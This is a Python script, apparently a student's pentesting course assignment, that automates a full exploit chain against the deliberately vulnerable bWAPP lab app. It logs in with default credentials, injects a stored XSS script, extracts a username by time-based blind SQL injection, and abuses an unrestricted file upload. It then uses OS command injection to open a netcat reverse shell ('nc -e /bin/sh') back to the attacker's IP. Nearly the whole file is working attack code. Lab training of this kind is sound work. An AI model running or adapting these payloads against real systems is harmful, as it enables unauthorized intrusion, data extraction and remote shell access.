###########################################
#### Prueba 4: Full chain en app bWAPP ####
###########################################
## Asignatura: Pentesting Web Avanzado ####
## Alumno: Adolfo Acuña Arancibia #########
###########################################
## Script que realiza la explotación de ###
## las vulnerabilidades: ##################
## Cross-Site-Scripting - Stored (Blog) ###
## SQL Injection - Blind - Time Based #####
## Unrestricted File fileupload ###########
## Os Command Injection ###################
###########################################

import requests
import argparse
from urllib.parse import quote
import random
import string
import os
from tqdm import tqdm

##Credenciales por defecto
user = "bee"
password = "bug"

##Función que realiza una conexión al sitio vulnerable de acuerdo a la IP, usuario y password.
##Se reconoce si las credenciales son correctas de acuerdo al mensaje de respuesta recibido. 
##Se agrega control de errores.
def Autenticacion(ip, user, password):
	s = requests.Session()
	data = {"login":user, "password": password, "security_level":"0","form":"submit"}
	urlLogin = f"http://{ip}/bWAPP/login.php"
	try:
		req = s.post(urlLogin, data=data, allow_redirects=True)
	except Exception as e:
		print(f"[-] - Error al conectar con el host: {e}")
		exit()
	#validar mediante un mensaje de la respuesta que la autenticación fue exitosa
	print('[++] - Probando credenciales: '+user +':' +password)
	if "or a buggy web application" in req.text:
		print("[+++] - Ingreso exitoso!")
		##Fijación de cookie de usuario
		cookies = s.cookies.get_dict()
		xss(s,ip,cookies)
		sqli_time(s,ip,cookies)
		fileupload(s,ip,cookies)
		oscommandiny(s,ip,cookies)
	elif "Invalid credentials or user not activated" in req.text:
		print("[-] - Credenciales inválidas")
	else:
		print("[-] - Hubo un problema")


##XSS Injection
##Realiza una inyección XSS almacenada . 
##La inyección XSS se realiza en la URL sobre el endpoint vulnerable.
def xss(s,ip,cookies):
	print("[+] - Probando Inyección XSS Almacenada")
	#inyección que busca el mail del usuario bee
	payload = "<script>alert('10')</script>"
	data = "entry="+payload+"+&blog=submit&entry_add="
	url = f"http://{ip}//bWAPP/xss_stored_1.php"
	r = s.get(url, cookies=cookies, data = data)
	#print(payload + " - " +  r.text)
	##identificación si es vulnerable a XSS en base al texto reflejado en la respuesta y código HTTP
	if payload in r.text and r.status_code == 200:
		print("[+++] - XSS encontrado!!!!", payload)
		print("[+++] - Endoint vulnerable: " +url)
	else:
		print("[-] - No se pudo encontrar inyección XSS")

##SQL Inyection Blind time based
##Inyección basada en tiempo, extrae mediante inyección sql y reconocimiento de tiempo de respuesta el usuario actual
def sqli_time(s,ip,cookies):
	##Caracteres a probar
	letters = "abcdefghijklmnopqrstuvwyz"
	##String a descubrir
	user_extracted=''
	print("[+] - Probando Sql Inyection basado en tiempo:")
	for x in tqdm(range(1,len(user)+1), desc='[++] - Esperando respuesta'):
		for y in range(0,len(letters)):
			##endpoint vulnerable
			url = f"http://{ip}//bWAPP/sqli_15.php?title="
			##Payload que usa los condicionales booleanos para identificar si un caracter existe o no en la consulta
			title = f"' or 1=1 and substring((select login from users where login=\'bee\'),{x},1) = \'{letters[y]}\' and sleep(5)#"
			title=quote(title)
			url = url+title
			r = s.get(url, cookies=cookies)
			if(r.elapsed.seconds > 4.5):
				print(f"[++] - El caracter en la posición {x} es '{letters[y]}'")
				user_extracted=user_extracted+letters[y]
				y = 0
	print("[+++] - El usuario actual es: "+user_extracted)

##Unrestricted File Upload
##Script que sube un archivo .txt
def fileupload(s, ip,cookies):
	filename="AdolfoAcunaA.txt"
	print("[+] - Probando subida de archivos")
	# Crear el archivo "AdolfoAcunaA.txt" con el contenido definido en 'text'
	text = "test"
	with open(filename, 'w') as f:
		f.write(text)
	try:
		with open(filename, 'rb') as f:
			## Generación del boundary aleatorio
			boundary = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
			## Configuración de la solicitud
			files = {
				'file': (filename, open(filename, 'rb'), 'text/plain')
			}
			data = {
				'MAX_FILE_SIZE': '10',
				'form': 'Upload'
			}
			headers = {
				'Content-Type': f'multipart/form-data; boundary=----WebKitFormBoundary{boundary}',
				'Origin': f'http://{ip}',
				'Referer': f'http://{ip}/bWAPP/unrestricted_file_upload.php',
				'Upgrade-Insecure-Requests': '1',
			}
			## Construcción de el cuerpo de la solicitud
			payload = f'------WebKitFormBoundary{boundary}\r\n'
			payload += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
			payload += 'Content-Type: text/plain\r\n\r\n'
			with open(filename, 'r') as f:
				payload += f.read() + '\r\n'
			payload += f'------WebKitFormBoundary{boundary}\r\n'
			payload += 'Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n'
			payload += '10\r\n'
			payload += f'------WebKitFormBoundary{boundary}\r\n'
			payload += 'Content-Disposition: form-data; name="form"\r\n\r\n'
			payload += 'Upload\r\n'
			payload += f'------WebKitFormBoundary{boundary}--\r\n'

			## Envío de la solicitud POST
			print("[++] - Enviando el archivo")
			url = f"http://{ip}/bWAPP/unrestricted_file_upload.php"
			r = s.post(url, headers=headers, data=payload,cookies=cookies)

			## Confirmación de que el archivo se guardó correctamente consultando en directorio "/images"
			url_images = f"http://{ip}/bWAPP/images/"+filename
			print("[++] - Consultando archivo en "+url_images)
			o = s.get(url_images, cookies=cookies)
			if text in o.text:
				print('[+++] - Archivo enviado exitosamente!')
			else:
				print(f'[-] - Ocurrió un error al enviar el archivo. Código de estado: {r.status_code}')
	except FileNotFoundError:
		print(f'[-] - El archivo {filename} no se encontró')

##Función auxiliar que extrae la tu ip actual desde la misma interfaz que la red de la victima
def cualesmiip(ip):
	##extraigo la red desde la ip del servicio víctima
	redlocal= '.'.join(ip.split('.')[:3])
	##busco una ip local con la misma red de la víctima
	iplocal = os.popen(f'ip addr show | grep inet | awk \'/inet {redlocal}/ {{print $2}}\' | cut -d/ -f1').read()
	return(str(iplocal))

##Función que explota la ejecución remota de comandos (RCE) en el servicio
def oscommandiny(s,ip,cookie):
	##Defino mi ip
	miip=cualesmiip(ip).rstrip().split('.')
	miip_str = ".".join(miip)
	print("[+] - Explotando RCE! -")
	print("[++] - Mi ip actual: "+miip_str)
	##Se lanza terminal con puerto a la escucha
	os.system("gnome-terminal -e 'nc -lvp 8443'")
	##Payload que invoca la ip:puerto del atacante
	data = {'target':'test; nc -e /bin/sh '+miip_str+' 8443','form':'submit'}
	url = f"http://{ip}/bWAPP/commandi.php"
	r = s.post(url, data=data,cookies=cookie)
 
##En la función principal se controlan los argumentos recibidos y se hace la Autenticación de acuerdo al usuario y contraseña configurado.
def main():
	parser = argparse.ArgumentParser(description='Prueba 4 en bWAPP')
	parser.add_argument('--ip', metavar='IP', type=str, required=True, help='La dirección IP del servidor')
	args = parser.parse_args()

	print("[+] - Iniciando")	
	Autenticacion(args.ip, user, password)
	print("[++++] - Finalizado")
if __name__ == "__main__":
	main()
